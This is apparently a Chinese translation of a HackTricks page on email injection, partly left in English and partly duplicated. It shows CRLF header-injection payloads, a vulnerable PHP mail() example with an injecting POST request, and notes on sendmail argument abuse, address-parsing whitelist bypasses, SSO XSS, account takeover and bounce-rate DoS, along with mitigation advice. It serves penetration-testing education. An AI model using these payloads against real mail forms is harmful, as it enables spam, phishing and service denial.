# 邮件注入

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 在发送的电子邮件中注入

### 在发送者参数之后注入抄送和密送
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
### 注入参数

The message will be sent to the recipient and recipient1 accounts.

### 注入参数
```
From:sender@domain.com%0ATo:attacker@domain.com
```
### 注入主题参数

The message will be sent to the original recipient and the attacker account.

消息将发送给原始收件人和攻击者账户。
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
伪造的主题将被添加到原始主题中，在某些情况下可能会替换原始主题。这取决于邮件服务的行为。

### 更改消息正文

注入两行换行符，然后编写您的消息以更改消息的正文。
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() 函数的利用

The `mail()` function in PHP is commonly used to send emails from a web application. However, if not properly secured, it can be vulnerable to email injection attacks. Email injection occurs when an attacker is able to manipulate the email headers and inject malicious content into the email.

PHP mail() 函数常用于从 Web 应用程序发送电子邮件。然而，如果没有正确地进行安全设置，它可能会受到电子邮件注入攻击的威胁。电子邮件注入是指攻击者能够操纵电子邮件头部并向电子邮件中注入恶意内容。

#### Exploiting Email Injection

To exploit email injection in PHP mail(), an attacker can manipulate the `to` parameter of the function and inject additional email headers. This can be done by appending a new line character (`\n`) followed by the desired headers and their values.

要利用 PHP mail() 中的电子邮件注入漏洞，攻击者可以操纵函数的 `to` 参数并注入额外的电子邮件头部。这可以通过在所需的头部及其值之后添加一个换行符（`\n`）来实现。

For example, consider the following vulnerable code:

例如，考虑以下存在漏洞的代码：

```php
$to = $_POST['email'];
$subject = "Welcome to our website!";
$message = "Thank you for signing up.";
$headers = "From: noreply@example.com";

mail($to, $subject, $message, $headers);
```

An attacker can exploit this by injecting additional headers using the `to` parameter:

攻击者可以通过使用 `to` 参数注入额外的头部来利用这个漏洞：

```
POST /contact.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=test@example.com%0ABcc: attacker@example.com%0AReply-To: attacker@example.com
```

In this example, the attacker injects the `Bcc` and `Reply-To` headers, which will be included in the email sent to the victim.

在这个例子中，攻击者注入了 `Bcc` 和 `Reply-To` 头部，这些头部将包含在发送给受害者的电子邮件中。

#### Impact of Email Injection

Email injection can have various impacts depending on the attacker's intentions. Some possible consequences include:

- Spamming: The attacker can use the victim's email address to send spam emails, potentially causing reputation damage.
- Phishing: By injecting malicious links or content into the email, the attacker can trick the recipient into revealing sensitive information or performing malicious actions.
- Denial of Service (DoS): By injecting a large number of recipients or using a large email body, the attacker can overload the mail server and cause a DoS condition.

电子邮件注入可能会产生不同的影响，具体取决于攻击者的意图。一些可能的后果包括：

- 垃圾邮件：攻击者可以使用受害者的电子邮件地址发送垃圾邮件，可能会造成声誉损害。
- 钓鱼：通过向电子邮件中注入恶意链接或内容，攻击者可以欺骗收件人透露敏感信息或执行恶意操作。
- 拒绝服务（DoS）：通过注入大量的收件人或使用大量的电子邮件正文，攻击者可以过载邮件服务器并导致 DoS 状况。

#### Prevention and Mitigation

To prevent email injection attacks, it is important to properly sanitize and validate user input before using it in the `mail()` function. Here are some recommended measures:

- Validate input: Ensure that the user-supplied email address is valid and does not contain any malicious characters or additional headers.
- Sanitize input: Remove any newline characters or other special characters that could be used for injection.
- Use a secure email library: Consider using a secure email library that handles email headers and addresses properly, reducing the risk of injection.
- Implement input validation and output encoding: Apply input validation and output encoding techniques to prevent other types of injection attacks.

为了防止电子邮件注入攻击，重要的是在使用 `mail()` 函数之前正确地对用户输入进行清理和验证。以下是一些推荐的措施：

- 验证输入：确保用户提供的电子邮件地址有效，并且不包含任何恶意字符或额外的头部。
- 清理输入：删除任何换行符或其他特殊字符，以防止注入攻击。
- 使用安全的电子邮件库：考虑使用一个安全的电子邮件库，它可以正确处理电子邮件头部和地址，从而降低注入的风险。
- 实施输入验证和输出编码：应用输入验证和输出编码技术，以防止其他类型的注入攻击。
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 第5个参数（$additional\_parameters）

本节将基于**假设攻击者控制该参数的滥用方式**。

该参数将添加到命令行中，PHP将用它来调用二进制sendmail。然而，它将通过函数`escapeshellcmd($additional_parameters)`进行过滤。

攻击者可以在这种情况下**注入sendmail的额外参数**。

#### /usr/sbin/sendmail实现的差异

**sendmail**接口是由系统上安装的MTA邮件软件（Sendmail、Postfix、Exim等）提供的。尽管出于兼容性原因，**基本功能**（如-t -i -f参数）保持**相同**，但**其他功能和参数**根据安装的MTA而有很大差异。

以下是sendmail命令/接口的不同man页面的几个示例：

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

根据**sendmail的来源**，已经发现了不同的选项来滥用它们并**泄露文件甚至执行任意命令**。在[**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)中查看如何操作。

## 在电子邮件名称中进行注入

### 忽略的电子邮件部分

符号：**+，-**和**{}**在极少数情况下可用于标记，并被大多数电子邮件服务器忽略。

- 例如：john.doe+intigriti@example.com → john.doe@example.com

括号（）中的注释在开头或结尾也将被忽略。

- 例如：john.doe(intigriti)@example.com → john.doe@example.com

### 白名单绕过

<figure><img src="../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>

### 引号

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### IP地址

您还可以使用IP地址作为方括号之间的域名：

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### 其他漏洞

![](<../.gitbook/assets/image (296).png>)

## 第三方SSO

### XSS

一些服务（如**github**或**salesforce**）允许您在**电子邮件地址中使用XSS有效负载**。如果您可以使用这些提供商登录其他服务，并且这些服务没有正确地对电子邮件进行过滤，您可能会引发**XSS**。

### 接管账户

如果**SSO服务**允许您**创建一个未验证的电子邮件地址的帐户**（如**salesforce**），然后您可以使用该帐户登录**信任**salesforce的其他服务，您可以访问任何帐户。\
请注意，salesforce会指示给定的电子邮件是否已验证，因此应用程序应考虑此信息。

## 回复地址（Reply-To）

您可以使用_**From: company.com**_和_**Replay-To: attacker.com**_发送电子邮件，如果由于电子邮件是从**内部地址**发送的而发送了**自动回复**，则**攻击者**可能能够**接收**该**回复**。

## 强制退信率（Hard Bounce Rate）

一些应用程序（如AWS）具有**强制退信率**（在AWS中为10%），当超载时，电子邮件服务将被阻止。

**强制退信**是由于某些永久原因无法传递的电子邮件。也许是电子邮件是虚假地址，也许是电子邮件域不是真实域，或者可能是电子邮件接收者的服务器不接受电子邮件。这意味着，如果1000封电子邮件中有100封是虚假的或无效的，导致所有电子邮件都被退回，**AWS SES**将阻止您的服务。

因此，如果您能够从Web应用程序发送邮件（例如邀请函）到任何电子邮件地址，您可以通过向不存在的用户和域发送数百封邀请函来引发此阻止：电子邮件服务拒绝服务攻击（Email service DoS）。

## 参考资料

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
